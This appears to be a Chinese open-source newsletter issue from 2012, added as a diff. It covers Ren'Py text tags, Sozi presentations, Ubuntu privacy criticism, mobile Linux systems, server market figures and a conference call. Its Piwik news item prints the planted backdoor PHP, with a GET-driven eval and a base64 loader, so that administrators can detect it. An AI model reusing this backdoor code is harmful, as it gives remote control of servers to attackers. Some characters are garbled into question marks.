+之前沒有特別提及，除了小字字數太多以外，還有另外一種狀況也會導致 "Ruby glyph out of bounds"，就是敘事者的 line_leading 與 ruby style 中的 size 尺寸不匹配－－簡單地說，ruby 文字的字體太大而文字上方留空空間不夠大，也會讓 Ren'Py 抗議沒有空間可以顯示。還請注意。
+
+囉唆了這麼說，總之一句話：ruby text 效果很好，但也非常嬌貴，一不小心就會壞掉。以上。
+
+
+【請注意官網範例】如果您還是不甚明白，官網對於 ruby text 的解說見這裡：http://www.renpy.org/doc/html/text.html#ruby-text。
+但請注意此處官網範例中，將新設定的 ruby_style 指定給 style.default－－這種作法會讓遊戲中的所有文字（包括按鈕上的文字，所有的！），全都能使用 ruby style 效果，但副作用就是讓所有文字的上方都多出不自然的空白空間......故並不推荐直接套用。
+
+參考就好！
+
+
+速度與等待
+
+ruby text 講得太興奮，其實我們還有一些標籤沒講到，這就回頭看去。
+
+
+＊cps：
+    本標籤可以控制文字每秒顯示的字數。
+    可以是一個絕對的數字，也可以是基於當前顯示速度的變化值。比方說「{cps=*2}文字文字文字{/cps}」這樣。
+＊fast：
+    這個標籤前的文字會瞬間顯示出來，無視於 cps 或其他設定。
+＊nw：
+    表示 no wait（不等待）。本行文字顯示完後，「不用按滑鼠」就能自動前進到下一行的腳本指令。
+＊p：
+    等待指定的秒數或經過滑鼠點擊，然後才換行繼續。
+＊w：
+    同 p 不過不換行。
+
+以下示範 nw 與 fast 的用法：
+
+"要我說對那傢伙有什麼意見的話......{nw}"
+
+show table garbage with dissolve
+
+"要我說對那傢伙有什麼意見的話......{fast}總之，太不懂得收整桌面也實在是個問題。"
+
+上面這組範例，看起來就像是對話講到一半，在螢幕上顯示了一張圖，接著再繼續把話說完那樣。
+
+（要達到以上效果不光只有這種寫法，此處只是舉例。）
+
+w 標籤的用法：
+
+"你、{w=0.2}你、{w=0.2}你……你這個傢伙！果果果……{w=0.2}果然是在耍我對吧！"
+
+讓對話能一頓一頓地進行，效果很有趣。本範例您可以讓傲嬌角色試試看。
+
+p 標籤用法：
+
+    "聊起上次與小鬼們的約定，莎菈學姊一如往常那樣，很不淑女地搔搔腦袋。她隨意地將看到一半的口袋小說撕下一頁，這又抽出筆。"
+    "我將腦袋探過去。"
+    "買材料：{p}砂糖600g裝：約45元{p}麵粉1kg裝：約110元{p}酥油200g裝：150元{p}布丁一個：20元{p}......"
+    "「給你吧」學姊說著將紙張遞給我。"
+    "雖然身為一個男性，沒什麼做料理的經驗也是事實，但那個布丁是怎麼回事？"
+    "......身為人類的常識似乎被鄙視，有種微妙的忿怒感。伴隨著深呼吸，空氣輕輕顫動了起來。"
+
+(http://www.openfoundry.org/images/121211/RenPy/17.jpeg)
+▲ 圖17：p 標籤的效果示範。除了第一行以外，後續每行都要按滑鼠鍵才會繼續顯示出來。
+
+
+結語
+
+懷疑嗎？這樣就結束了？
+
+哈哈，無需懷疑各位，這種簡單小巧的章節也是有的啦。
+
+「（小聲）......其實也不怎麼小巧吧？」
+
+呃......算是比較小巧了啦，稍微。
+
+在此提示各位，本章提及的所有文字修飾技巧，包括標籤與變數等等，都不僅僅只能用於對話中。具體說來，包括按鈕上的文字、label、用 Text() 宣告產生的 ui 文字（我們目前還沒聊到）等等，所有可能被顯示在螢幕上的文字，都可以被本章所提及的技巧加以修飾。使用範圍可說相當寬廣，就看您的想像力了。
+
+那麼，下回又要講些什麼才好呢？
+
+雖然一直逃避，不願意去凝視那片深淵，但不正面面對，果然還是不行的對吧？
+
+下一回，我們要稍微深入一下 Ren'Py 的圖片渲染系統了。
+
+依遊戲需要動態替圖片著色、動態切割部份圖片、各種可被顯示的類圖片組件、layer 系統......以及最最重要的、能輕易表現出各種複雜動畫與變形效果的 ATL 動畫轉置語言......啊啊，這麼說來，每項都是大題目啊。究竟能介紹到什麼程度，主持人我也沒太大把握。或許稍微拆分一下也不壞......？
+
+不過不用擔心，這些都只是枝微末節而已－－沒問題的......再深的深淵，也能讓我們一起用根性突破！
+
+相信相信著你的我吧！
+
+敬請期待 Ren'Py 次回！
+
+（本篇完！）
+_______________________________________________________________
+
+■ [源碼秘技] 簡報軟體 sozi 製作技巧 - inkscape + sozi = prezi + 開放自由
+
+ckhung／文
+
+◎ 本文原載 "資訊人權貴" 之家，原文章連結(http://people.ofset.org/~ckhung/b/svg/sozi.php)。
+
+Sozi 是 inkscape 的外掛。有了它, 就可以製作出像 prezi 一般的旋轉 / 縮放簡報。請見我用 sozi 製作的幾個簡報範例 (http://people.ofset.org/~ckhung/mm/)。因為 inkscape + sozi 採用開放的向量圖檔 svg + javascript 格式存檔, 而且檔案格式非常輕巧簡潔, 所以有很多優點:
+
+
+＊任何瀏覽器都可以看; 不需要特殊播放軟體。
+＊可以放雲端、也可以在本機播放。
+＊除了 inkscape 之外, 其他支援 svg 的軟體工具應該也可以對成果圖檔做簡單的編輯。
+＊甚至連文字編輯器也可以做簡單的編輯 -- 也因此, 搭配 regexp (http://people.ofset.org/~ckhung/b/re/)就可讓「批次修改簡報內容」變得極為容易。 (我喜歡用 html 遠勝過 odt 其中最重要的原因與此相同)
+＊如果你不介意動一點小手腳的話, 簡報所使用到的圖片可以用連結的方式匯入, 於是圖片檔可以重複使用而簡報檔可以很小 (不含圖片單就 svg 檔本身而言, 我所做的簡報檔都只有幾十 K 而已)
+
+
+第 1 節 安裝
+
+在 fedora 17 底下: yum install inkscape-sozi 本篇的動作都是在這個環境底下進行的。
+
+在 ubuntu 12.04 底下: (我沒完整測試; 感謝讀者 Explorer 分享安裝經驗 http://newtoypia.blogspot.com/2012/11/sozi.html?showComment=1354118720352#c8905679893334603103)
+
+	sudo bash
+	add-apt-repository ppa:sunab/sozi-release
+	apt-get update
+	apt-get install sozi
+	exit
+
+
+第 2 節 基本操作
+
+大致上就是以下幾個簡單步驟:
+
+＊用 inkscape (http://people.ofset.org/~ckhung/b/svg/inkscape.php) "畫" 好你的簡報。每個物件都可以是一個頁框 (frame)。如果想要在一個頁框裡面同時放入好幾個物件, 就要把它們 group 起來成為一個物件, 或是畫一個矩形把它們框起來, 然後以這矩形為頁框也可以。不必擔心矩形的邊框, 因為等一下可以選擇隱藏矩形。
+(http://www.openfoundry.org/images/121211/Sozi/sozi1.jpg)
+＊點選 其中一個物件或一個 group 或一個矩形。
+＊從 inkscape 的「擴充功能」選單當中叫出 sozi。這時 sozi 的對話框出現; 而 inkscape 暫時不能使用。
+＊在 sozi 對話框的左下角找到綠色的加號, 按下去之後, 先前點選的那個物件 /group/ 矩形就被加進你的簡報成為一個頁框了。
+＊調整各項屬性。
+＊按下確定, sozi 對話框消失, 控制權交還給 inkscape。
+＊存檔; 先不要關掉 inkscape; 用 firefox 開啟你的 svg 檔, 檢查是否正確。
+＊回到第二步繼續加入下一頁框。
+sozi 對話框很簡單 (也可以說很陽春): 總之就是要在左側的頁框清單裡面選取一個頁框, 然後就可以用下面的按鈕刪除 / 複製 / 調整順序, 或是用對話框右側的欄位調整各種屬性。但「新增頁框」功能永遠都只適用於 [進入 sozi 之前所選的那個物件]。
+(http://www.openfoundry.org/images/121211/Sozi/sozi2.jpg)
+
+
+第 3 節 Sozi 檔案格式
+
+內含 sozi 的 svg 檔案格式也很簡單。sozi 並沒有去動原始的 svg 內容 (從＜g ... ＞到＜/g＞ 的部分), 只是在最後面加上了一段＜script id="sozi-script" ...＞ ... ＜/script＞。每個頁框的各欄位資訊也很清楚簡單:
+(http://www.openfoundry.org/images/121211/Sozi/so3.jpg)
+
+＊ns1:refid: 本頁框對應到圖檔裡面的哪一個元素?
+＊ns1:title: 在頁框總覽 (按 t 鍵) 裡面所呈現的標題
+＊ns1:sequence: 本頁框在整份簡報裡面出現的頁次
+＊ns1:hide: 這個元素本身要不要隱藏起來?
+＊ns1:clip: 要不要把本頁框以外的部分 (旁邊的圖) 切掉?
+＊ns1:timeout-enable: 要不要定時自動跳離本頁框?
+＊ns1:timeout-ms: 多久以後自動跳離本頁框 (跳到下一頁) ?
+＊ns1:transition-duration-ms: 花多少時間秀換場動作?
+＊ns1:transition-zoom-percent: 換場縮放
+＊ns1:transition-profile: 採用哪種換場特效?
+
+
+第 4 節 sozi 簡報上雲端
+
+如果希望你的 sozi 簡報可以上網 (而不是只能用 firefox 的「檔案」 =＞ 「開啟檔案」瀏覽) 那麼有兩個方案:
+
+＊在 inkscape 裡面用「檔案」 =＞ 「匯入」圖檔時, 記得選取「內嵌」而不是「連結」。這樣 svg 檔會變很大, 但就不怕移動路徑會造成圖片消失。
+＊相反地, 如果當初匯入圖檔時選取「連結」, 那麼 svg 檔就還是很小, 但必須用文字編輯器進入 svg 檔, 手動將 ＜image ... /＞裡面的 xlink:href 後面的路徑改掉。請檢視我的範例的原始碼。
+
+注意: 每次用 inkscape 編修過後, 這個 svg 檔裡面的所有 image 的 xlink:href 路徑又會被 inkscape 改回檔案系統的路徑。所以我都會再用一句 perl script 後置處理:
+
+perl -pe 's#xlink:href="/ 被 inkscape ?? 上的路徑 #xlink:href="?? 希望的網址路徑 #' 簡? ?檔 .svg ＞新簡 ? ? 檔.svg
+
+另一個注意: 第一次一定要手動更改; 上面的 script 只能用於第二次以後的更改。當你成功試過很多次之後, 可以考慮把上面的指令改成:
+
+perl -pe -i.bak '...' 簡 ? ? 檔 .svg
+
+這個 "-i.bak" 意思是直接修改「簡報檔.svg」 (in-place) 並把舊的檔案備份在「簡報檔.svg.bak」。如果你 (像貴哥一樣) 很猛, 不怕不小心毀掉資料, 還可以把 ".bak" 省略掉, 就連清除備份檔的麻煩都省下來了。
+
+
+第 5 節 Sozi 編輯小技巧
+
+＊我都先把所有素材胡亂丟到畫布上, 然後再一併整理。全部整理完以後, 才一口氣把所有頁框加入 sozi。
+＊如果你像我一樣懶惰, 就會先丟著頁框屬性不管, 等全部排完後再用 vim (或其他文字編輯器) 進 svg 檔全面代換。
+＊當你用群組 (group) 功能來組頁框時, 請先把相關物件組成一個群組, 然後才旋轉。如果你先旋轉個別物件再組頁框, sozi 就不會懂得如何正確旋轉這個頁框。
+
+
+第 6 節 sozi 簡報製作建議
+
+這一節是我個人的簡報製作心得, 不一定適用於每個人。以後將陸續增加。
+
+＊按照概念的相關性 -- 而不是按照簡報頁框的順序 -- 來安排畫布。
+＊有時候一個頁框在簡報前後不同時段出現也很有強調效果。
+＊不要過度使用旋轉。我通常只在表達「轉換觀點」或「眾星拱月」的情況下才加入旋轉。
+
+關於 sozi, 您有心得想要分享嗎 ? 請到這一帖部落格 (http://newtoypia.blogspot.tw/2012/11/sozi.html) 留言。
+_______________________________________________________________
+
+■ [自由專欄] Richard Stallman 指責 Ubuntu 是「間諜軟體」
+
+Kenneth Mak／文
+
+◎本文原載 Linux Pilot，原文章連結 (http://www.linuxpilot.com/industry/news/201212100101Richard-Stallman-Ubuntu)。
+
+自由軟體基金會主席及開源軟體之父 Richard Stallman，最近指責 Canonical 的 Linux 作業系統 Ubuntu 是「間諜軟體」，原因是 Canonical 在Ubuntu 12.10加入了Amzon的搜尋功能。這項指控是否成立？
+
+(http://www.openfoundry.org/images/121211/Rihcard.jpg)
+
+有用過 Windows 8 的朋友，大概都會用過它的 Windows UI（舊稱 Metro UI）搜尋應用程式。事實上這機制早已在 Ubuntu上出現，用戶可以劃一地在搜尋欄搜索網上或系統的任何內容，只是現在加入了新功能令用戶可同時搜尋 Amzon 內容而已。Canonical 首席執行長 Mark Shuttleworth 就此作出解釋，表示 Canonical 只不過是把 Amzon 的搜索結果整合，如果用戶通過 Ubuntu 的搜索購買了亞馬遜的商品，Canonical 將會得到部分收入。
+
+Stallman 表示問題重點是 Canonical 收集用戶個人資訊，但 Shuttleworth 的回覆是 Canonical 會自動將用戶日誌做匿名化處理，目的是提供更好的搜索體驗。如果用戶覺得不安，可以自行關閉 Amzon、Google、Facebook 和 Twitter 服務的相關選項。不少開源界人士都認同 Amzon 的搜索結果與購物有關，整合的目的顯然是為了經濟利益。但天下不會有免費的午餐，Canonical 作為一間企業，就需要有收入。收入不外乎兩種，一是向用家徵收，一是向廣告商徵收。微軟走的是第一條路，Canonical 只不過想走另一條路而已。
+
+Stallman 支持者可能會問：為什麼 Fedora 和 openSEUSE 沒有如此做？很簡單，因為支持此兩個 Linux 版本的兩家企業 Red Hat 和 Novell，本來就另外有一個收費的企業版本作為收入來源。今後 Ubuntu 如果要成為像 Fedora 和 openSEUSE 一樣，就有需要將 Ubuntu 分家成「開源版」和「收費版」，由收費版向「開源版」提供財政支援，才能徹底平息此等風波。
+
+作為開源軟體的先驅，筆者對 Richard Stallman 非常敬重，但縱使他是「教主」，並不代表我們對他說的話照單全收。開源技術在 IT 產業本來就並不是多數派，大家應該體諒不同團體的立場，只有大家齊心向外，開源技術才能開花結果。
+_______________________________________________________________
+
+■ [源碼新聞] 5 套敢於與 Android 競爭的行動 Linux 作業系統
+
+謝良奇／編譯，本文翻譯自 Linux.com，原作者為 Eric Brown
+
+還未踏進 2013 年，似乎已經先行嗅到行動作業系統市場的煙硝味。明年將是行動作業市場擁擠的一年，面對 Google、Apple、Microsoft、RIM 等市場先行者，仍有許多最新的行動開放源碼 Linux 專案正蓄勢待發，包括 Firefox OS、Open WebOS、Jolla's Sailfish、Tizen 以及 Ubuntu。其中多數專案都預計在 2013 年推出新裝置，除了智慧型手機，還有像是平板等其他裝置。以下讓我們仔細檢視各個專案。
+
+Firefox OS
+
+Mozilla 在 2011 年 7 月宣布 Boot to Gecko 的消息，並於 2012 年 6 月改以 Firefox OS 之名重新推出。該作業系統將在中國大廠 ZTE 與 TCL 的韌體上執行，並獲得多達 7 家電信營運商的支持。目前僅有西班牙的 Telefonica 實際承諾於 2013 年初，在巴西以旗下 Vivo 品牌推出一支入門款手機。
+
+Firefox OS 和 Tizen 同樣擁有支援使用 HTML5 網路應用程式的 API，將可贏得應用軟體開發上的優勢。有了 HTML5 再加上 Gecko 引擎對 Qualcomm Snapdragon 處理器做的硬體最佳化，Firefox OS 號稱能將低價手機的性能發揮到最大。由於免去了原生應用程式平台所需的多數中介軟體，有助降低成本、提高效能、減少電耗。
+
+其大膽激進的設計令人聯想到 Chrome OS。跟該桌面系統一樣，Firefox OS 可能在吸引已經習慣原生應用程式的用戶時遭遇困難。然而，比起 Android 與 iOS 現有用戶，未開發市場中將購買第一支智慧型手機的用戶才更是該作業系統的主要目標，對於這些新手，聚焦在瀏覽器上或許是不錯的策略。
+
+
+Open WebOS
+
+從宣布開放源碼歷時約 9 個月後，HP 的 Open WebOS 專案在 9 月 28 日釋出了 1.0 版本。雖然該公司執行長 Meg Whitman 一開始大談在 2013 年推出第一款智慧型手機的想法，不久後卻改口表示 HP 品牌的手機應該會在 5 年內問世。
+
+Open WebOS 完全以開放源碼元件重新打造，包括 QtWebKit、OpenAL Soft、OpenGL ES、WebGL、Gstreamer。HP 也釋出了部分 WebOS 生產力應用程式的開放源碼版本。1.0 版本同時提供了採用 Ubuntu 的桌面開發平台，以及基於 OpenEmbedded 的 Yocto 專案版本的硬體導向構建系統。對於有意打造新 Open WebOS 裝置的開發者，受到廣泛採用的 OpenEmbedded 可說提供了明確指引。
+
+雖然目前只限於命令列介面，OpenEmbedded 提供了廣泛的交叉編譯支援，以及可執行核心服務的 ARM 模擬器。至於桌面系統則提供 Luna 系統管理器的 Ubuntu 應用程式，並支援以 HP 新近開放源碼的 Enyo 2.0 Javascript 框架所開發的第三方應用程式。
+
+
+Sailfish
+
+MeeGo 回來了。2010 年 2 月，Intel 與 Nokia 將 Moblin 與 Nokia 的 Maemo 專案加以合併為 MeeGo，MeeGo 在 Nokia 轉向 Windows Phone 之後很快地淡出。不久後由前 Nokia MeeGo 開發者組成的芬蘭新創公司 Jolla 企圖實現自己的 MeeGo 計劃。Jolla 執行長 Jussi Hurmola 今年 7 月時宣布今年將推出 2 款手機，交由中國手機零售公司 D.Phone Group 進行銷售。
+
+Jolla 於 10 月 2 日宣布隨著首款 D.Phone 手機在中國推出，名為 Sailfish 的更新版作業系統可於明年春季，授權給其他設備製造商、設計公司與服務公司。 根據 Jolla 表示，Sailfish 會是免費的，該公司今年稍早稱該作業系統絕大部份會開放源碼。Saifish 採用 Qt 框架，並以 Mer 開發分支為基礎。該分支曾被使用在唯一一款上市的 MeeGo 手機 Nokia N9 上。
+
+Tizen
+
+Tizen 是從 MeeGo 專案分拆出來的，其中採納的 MeeGo 程式碼比 Sailfish 更少。由 Linux 基金會 (The Linux Foundation) 所主管並擁有 Intel、Samsung 的支持，一年多前宣布的 Tizen 於 4 月推出了 1.0 版本，並於 9 月 25 日推出 2.0 的 alpha 版本。
+
+Samsung 於 6 月釋出數量有限的 Tizen 雙核心開發者手機，更預期在 2013 年初發表至少一款的 Tizen 手機。Tizen 聯盟成員 Huawei 也表示將打造 Tizen 手機，更有傳聞暗示 HTC、Asus、Acer 未來也可能推出 Tizen 裝置。
+
+相較於 Firefox OS 完全採用 HTML5，Tizen 以兩者兼容的做法，提供原生應用程式層，但也允許應用程式用 HTML5、JavaScript、CSS 等 web 技術開發。除了 Firefox OS 之外，Tizen 對 HTML5 提供了其他行動作業系統所不及的支援。
+
+Tizen 1.0 採用 X11 取代了 MeeGo 的 Qt，並結合了源自 Samsung Linux Platform 的 Enlightenment Foundation Libraries (EFL)。迄今其初期的智慧型手機介面主要來自 Samsung 的 TouchWiz 以及該公司的 LiMo UI 堆疊。除了 jQuery Mobile 框架的 widget 元件外，Samsung 的 Bada 的元件也納入 Tizen 當中。
+
+Samsung 的參與使得 Tizen 在 Linux 行動作業系統競爭者中，占有實際上的領導地位。然而考量到 Samsung 在 Android 手機上所獲得的成果，該公司會花多少力氣在 Tizen 上仍值得關注。
+
+Ubuntu
+
+藉著 Ubuntu Mobile and Embedded (UME)，Ubuntu 一直是 x86 平板與行動網際網路裝置上的作業系統替代選擇。然而這些產品並未在市場上發揮影響，Ubuntu 也從未推出過高知名度的平板。2011 年 Ubuntu 11.04 與其支持觸控的 Unity 介面推出，該年 10 月 Canonical 創辦人 Mark Shuttleworth 宣布，預計 2014 年春季推出的 Ubuntu 14.04 LTS，將推動平板、手機，以及從車輛到辦公室廚房在內的智慧型螢幕。
+
+Canonical 和 Jolla 一樣似乎特別對中國市場感興趣。該公司一名中國代表於 4 月時表示中國廠商準備在 2013 年提高 Ubuntu 平板生產。6 月時中國平板廠商 Smart Devices 為其 Android 4.0 平板 SmartQ T20，釋出了 Ubuntu 12.04 的韌體。
+
+在智慧型手機上，Canonical 正在嘗試不同的策略。該公司 2 月宣布了以代工為重點的混合式 Ubuntu for Android 平台，並表示年底前會推出第一款手機。在多核心手機上 Ubuntu for Android 允許 Android 和 Ubuntu 共享 Linux 核心。當處於行動中時，Android 扮演主導角色，不過當手機接上顯示器連接基座時，就會蹦出 Ubuntu 桌面。
+
+和類似的 Webtop 技術不同，Ubuntu for Android 呈現完整的桌面應用程式，以及針對某些 Android 功能提供桌面存取。顯然它並非 Ubuntu 手機，但卻是個開始。
+
+
+相關網址：
+
+5 套敢於與 Android 競爭的行動 Linux 作業系統
+https://www.linux.com/news/embedded-mobile/mobile-linux/648324-5-mobile-linux-oses-that-dare-to-compete-with-android
+_______________________________________________________________
+
+■ [源碼新聞] 駭客盜入網站後將惡意程式碼植入開源專案 Piwik 的安裝包
+
+黃郁文／編譯
+
+一位不知名的電腦駭客在破壞開源專案 Piwik 網路伺服器的安全機制後，將惡意程式碼植入了 Piwik 分析軟體的安裝包裡！Piwik 是用於傳輸即時網路流量的分析資訊程式，其功能類似 Google Analytics，不過可讓網站架設者安裝於自己的伺服器上進行自主管理。Piwik 截至目前為止，統計上已超過 120 萬次的下載記錄，且被廣泛地用於近 46 萬個網站上。發現這些惡意程式碼之後，該專案的維護人員對在 2012 年 11 月 26 日，共 8 小時網站安全空窗期間，下載安裝 Piwik 1.9.2 版本的使用者提出警告，其表示這些使用者的網站伺服器有可能執行內嵌有惡意程式碼的 Piwik。此 8 小時的空窗期間，起於世界標準時 15:45 至 23:59，被植入的後門 (backdoor) 程式碼，會主動將資料由伺服器送至 prostoivse.com 這個網址，該網域名稱以及 IP 位置，在過去就經常被報導是被線上惡意攻擊者所利用。
+
+此次安全失防事件，肇始於該名駭客利用 Piwik.org 網站上，所使用某一 WordPress 未公開插件 (plugin) 的安全漏洞進行攻擊，雖然 Wordpress 這樣的內容管理系統 (Content Management System, CMS)，本身透過開源的方式來提升系統的漏洞防堵效率，然而這並不表示被個別使用到的非開源插件，亦能跟上這樣的更新速度。Piwik 的安全性顧問表示：維修人員並沒有發現 Piwik 程式本身有任何可被利用的安全漏洞，但就是網站架設的管理機制需要再行加強。Piwik 專案的使用者，若想要確認伺服器是否執行的是有問題的後門版本，可以開啟檔案 piwik/core/Loader.php，看看是否有下述惡意程式碼：
+
+<?php Error_Reporting(0);       if(isset($_GET['g']) && isset($_GET['s'])) {
+ preg_replace("/(.+)/e", $_GET['g'], 'dwm'); exit;
+}
+if (file_exists(dirname(__FILE__)."/lic.log")) exit;
+eval(gzuncompress(base64_decode('eF6Fkl9LwzAUxb+KD0I3EOmabhCkD/OhLWNOVrF/IlKatiIlnbIOZ/bpzb2pAyXRl7uF/s7JuffmMlrf3y7XD09OSWbUo9RzF6XzHCz3+0pOeDW0C79s2vqtaSdOTRKZOxfXDlmJOvp8LbzHwJle/aIYEL0YWE$
+
+最後三行程式碼中有包含 base-64 編碼文字，那是惡意軟體用來壓縮資料，以掩飾所作所為。根據 The H Security 的報導，該程式碼組合顯示為檔案 lic.log，並啟動 /piwik/core/DataTable/Filter/Megre.php，好讓駭客可以持續利用後門進出受到感染的系統。Piwik的管理人員表示，使用者若發現前述程式碼，應該將 piwik/config/config.ini.php 檔案備份，然後將全部的 piwik 目錄刪除，之後重新至官網下載安裝更新版。截至目前為止，Piwik 的官方維修人員仍不願證實該 WordPress plugin 漏洞的細節資訊，也沒有提供有關後門攻擊的額外技術文件。
+
+其實相關的網站防護資安事件並不乏見，今年九月，SourceForge 於南韓的鏡像站 (mirror site) 上的 phpMyAdmin 專案，就被發現有被值入惡意程式碼；去年六月，WordPress.org 網站也要求站台上的所有帳號所有人必須更改密碼，因為管理員發現該網站也疑似被惡意軟體污染。三個月之前，PHP 程式語言的官網管理者，也發現他們其中一台伺服器的安全防護已被突破，維修人員進而耗費數天徹底檢測，是否有惡意程式碼潛藏在相關網站儲放的程式碼中。其實整體來看，自由軟體基金會 (Free Software Foundation)、Apache Software Foundation，以及 Linux Foundation 轄下的 Linux Kernel 維護網站，這幾年或多或少都有遭受到駭客的網路攻擊。
+
+大體而言，成熟並有穩定團隊維護的自由開源軟體專案，其安全性並不是一個過於讓人擔心的問題，這是因為開發與除錯者眾，所以當發現系統漏洞或是資安缺口時，往往能在短時間就被發現而得到修補。然而，若是在自由開源軟體專案上去混用並未開源的元件，則此時系統維安的責任，就要混合系統的管理者多盡一份心力，才有可能做到最高層級的防範。
+
+
+相關網址：
+
+＊駭客利用 WordPress plugin 將惡意程式碼植入 Piwik 專案的釋出檔案
+http://arstechnica.com/security/2012/11/malicious-code-added-to-open-source-piwik-following-website-compromise/
+
+＊Piwik 釋出檔被置入惡意程式的後門
+http://www.csoonline.com/article/722479/piwik-software-installer-rigged-with-back-door-following-website-compromise
+_______________________________________________________________
+
+■ [源碼新聞] 全球伺服器需求減少，Linux 伺服器不跌反升
+
+Kenneth Mak／文
+
+◎本文原載 Linux Pilot，原文章連結 (http://www.linuxpilot.com/industry/news/201212030101-IDC-Gartner-Linux)。
+
+美國市場研究機構 IDC 和 Gartner，最近公開了 2012 年第三季的全球伺服器銷售數字。兩家機構在數值上雖有分歧，但大方向卻十分一致。???。在全球伺服器需求減少之時，Linux 伺服器銷售卻不跌反升。
+
+(http://www.openfoundry.org/images/121211/Linux.jpg)
+
+根據 IDC 的調查，2012 年第三季，全球伺服器市場銷售額達 122 億美元，比 2011 年同期下跌 4.0%，Gartner 的調查結果則顯示比 2011 年同期下跌 2.8%。Gartner 的報告還顯示雖然銷售額減少了，但出貨量卻有 2.8% 的?加，反映伺服器銷售的利潤有所下降。
+
+但報告結果也不完全是壞消息，IDC 的數據顯示，Linux 伺服器的出貨量有所增加，2012 年第三季的銷售額達 26 億美元，比 2011 年同期上升 6.6%。另一方面 Windows 和 UNIX 伺服器的銷售額均有減少傾向，Windows 伺服器銷售額 62 億美元，比 2011 年同期比減少 0.9%。UNIX 伺服器銷售額為 21 億美元，比 2011 年同期比減少 14.2%。
+
+另一個業界傾向是 x86 伺服器市場的成長。IDC 和 Gartner 的數字均顯示，x86 伺服器銷售額有上升傾向，IDC 的數字顯示本季銷售額有 2.0% 上升，達 89 億美元，Gartner的數字顯示有 4.0% 的上升。至於 x86 架構以外的伺服器均錄得下降，IDC 表示採用 RISC、EPIC (Itanium Based) 和 CISC 的伺服器銷售額為 33 億美元，比 2011 年同期比減少 17.1%。 Gartner 的調查結果顯示，2012 年第三季的 RISC 和 Itanium 的 UNIX 伺服器銷售額為 33 億，比去年同期下跌 16.4%。非 x86 系伺服器的銷售額已經是連續 5 年下降，比率佔伺服器市場全體的 27%，是 IDC 自進行同一調查以來最低的數字。
+
+至於各大廠商業績方面，IDC 和 Gartner 都表示在 2012 年第三季，市佔率最高的是 IBM，其次分別是 HP、Dell、Oracle 和富士通，當中只有 Dell 的佔有率比去年同期有所上升。
+_______________________________________________________________
+
+■ [源碼新聞] CentOS、FreeBSD、Debian 登陸 AWS
+
+Kenneth Mak／文
+
+◎本文原載 Linux Pilot，原文章連結(http://www.linuxpilot.com/industry/news/2012112801CentOS-FreeBSD-Debian-AWS)。
+
+從前在 Amazon Web Services(AWS)，可使用的 Linux 版本不算多，但情況即將有所改變。2012 年 11 月 16 日，AWS Marketplace 正式追加對三種開源作業系統 CentOS、FreeBSD 和 Debian。
+
+(http://www.openfoundry.org/images/121211/opensouce.jpg)
+
+追加三個開源 OS 後，現時在 AWS 上可使用的開源系統將包括 AWS 自家的 Amazon Linux、CentOS、Debian、Fedora、Gentoo、Mandriva、Mint、OpenSolaris、PCLinuxOS、Red Hat Enterprise Linux、Slackware、SUSE Linux Enterprise Server、Ubuntu 和 FreeBSD。其中 CentOS 由 CentOS.org 提供，包括 32 和 64 位元版本。FreeBSD 則由 Colin Percival 提供，現時只有 64 位元版本。Colin Percival 在 2011 時曾經在 twitter 中提到，他其實是在 AWS 下利用 Windows 開機後，將映像檔臨時置換成 FreeBSD 的方法，所以目前只可以提供 64 位元版本。值得注意的是 Ubuntu。Ubuntu 由 Canonical 提供，分為免費版和附有技術支援服務的收費版，包括 32 和 64 位元版本。收費版每月 750 美元，另加每小時 0.09 美元的運算費用，可看到 Ubuntu 正在積極開拓財源。
+_______________________________________________________________
+
+■ [源碼新聞] OPEN 的力量：開啟音樂家的市場
+
+謝良奇／編譯 
+
+Sylvain Zimmer / 盧森堡（更多資訊：http://www.jamendo.com）
+
+當盧森堡音樂家 Sylvain Zimmer 發現到，沒有好的合法途徑可以和朋友線上分享音樂時，他決定自行創造。在 2004 年，他和兩位伙伴成立了 Jamendo，這個獨特的網路平台可以讓音樂家以創用 CC 授權將他們的音樂分享給所有人。這家公司採用免費增值模式 (freemium)，免費將所有內容提供給大眾，然後針對創用 CC 授權未允許的使用權利收取費用，並與音樂家拆分一半的營收。
+
+(http://www.openfoundry.org/images/121211/open.jpg)
+
+今天 Jamendo 上有超過 4 萬張採用創用 CC 授權的專輯可供免費合法下載。音樂家每天上傳數百首新歌曲。Jamendo 在全球擁有超過 5 千名用戶，包括付費授權在電影、廣告、電視節目中使用音樂的商業用戶。
+
+對某些音樂家而言這個結果相當令人印象深刻。巴塞隆納的樂器藝術家 Roger Subirana Mata 在 2008 年時加入 Jamendo，之後他的歌曲已經被聽過超過 60 萬次，商業用戶的授權也超過 300 次。Mata 在 Jamendo 部落格上寫道，「雖然看來矛盾，透過創用 CC 來做音樂授權，的確讓我的音樂更有市場、更有盈利、更出名。」
+
+Jamendo 共同創辦人 Pierre Gerard 說創用 CC 是該公司成功的基礎。「我們希望音樂家將創用 CC 授權、Jamendo 和自由音樂 的理念，視為在音樂散佈上一項真實且有利的選擇。」
+
+本文出自 The Power of Open (http://thepowerofopen.org/) P31 
+_______________________________________________________________
+
+■ [源碼新聞] Taiwan WebConf，2013 年 1/12 ~ 1/13 在中研院人社館，英雄集結！
+
+Taiwan WebConf／文
+
+WebConf Taiwan - 專為網站開發者舉辦的大型研討會
+
+網站開發是個很複雜的議題，從前端的美術設計到後端程式設計、資料庫、資訊安全、資訊法律等議題牽涉非常廣泛。本次邀請到的講師們除了介紹網站開發相關的技術之外，也會在美術設計、介面設計、使用者體驗等各方面分享相關議題；除了網站建置，網站經營也是我們的重點之一，希望對 Web 開發、設計有熱情的人，一起來參與本次的 WebConf Taiwan 2013 活動！
+
+
+WebConf Taiwan 2013 徵求微議程 (Call for Lightning Talks)
+
+什麼是微議程?
+微議程 (lightning talk) 跟其它的議程一樣，也是一樣站在講台上跟大家分享議題，不同的是演講時間只有5分鐘(包括投影機設置的時間)。
+
+微議程將會在最大的國際會議廳進行，屆時所有的會眾都將集中到這邊，您可以跟所有與會的會眾介紹、分享您的想法、技術，或是熱情。如果您也有些想法想來跟大家分享，我們相信這會是個刺激而且有趣的好機會。
+
+投稿主題
+我們正在徵求 5 分鐘的微議程 (Lightning Talk)， WebConf Taiwan 2013 的講題方向包括：
+
+＊前、後端程式設計
+＊網站UI / UX 設計
+＊主機建置、維護
+＊網路安全
+＊資訊法律
+大致方向如上，但並不一定僅限於上列項目，若您覺得也有其它跟 Web 開發、設計有關的有趣主題也非常歡迎。
+
+投稿方式
+信件主旨為「WebConf Taiwan 2013 微議程投稿」，並請附上下列資料：
+
+＊姓名或暱稱
+＊50 字內簡介
+＊個人網站或社群連結(非必填)
+＊主題
+＊簡介
